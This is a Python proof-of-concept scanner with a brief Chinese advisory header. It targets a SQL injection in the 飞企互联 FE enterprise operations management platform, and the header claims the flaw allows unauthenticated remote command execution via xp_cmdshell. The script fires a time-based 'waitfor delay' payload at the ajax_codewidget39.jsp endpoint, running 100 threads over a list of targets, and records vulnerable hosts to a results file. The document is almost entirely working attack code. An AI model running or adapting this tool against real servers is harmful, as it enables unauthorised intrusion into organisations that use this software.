#飞企互联-FE企业运营管理平台 多处 SQL注入致RCE漏洞复现
#飞企互联-FE企业运营管理平台 checkGroupCode、eficientCodewidget39、ajax_codewidget39等接口存在SQL注入漏洞，未经授权攻击者通过利用SQL注入漏洞配合数据库xp cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
#version < 7.0
#app="FE-协作平台" FQHLFE_ajax_codewidget39_sql.py
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from time import sleep
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              飞企互联-FE企业运营管理平台 ajax_codewidget39接口SQL注入漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 飞企互联-FE企业运营管理平台 ajax_codewidget39接口SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = "/common/ajax_codewidget39.jsp;.js?code=1';waitfor+delay+'0:0:5'--"
    url = target+payload_url
    headers = {
        'Accept':'application/json, text/javascript, */*',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
    }

    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=6)
        time_taken = res.elapsed.total_seconds()
        # print(time)
        if res.status_code == 200 and 5 <= time_taken < 7:
            print(f"{BLUE}[+]该站点存在sql延时注入漏洞,url:{target}{RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else :
            print("[-]该站点不存在sql延时注入漏洞 ,url:"+target)
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")        
    except Exception as e:
        print(f"[*] 请求发生异常,URL: {target}, 错误信息: {str(e)}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

if __name__ == '__main__':
    main()
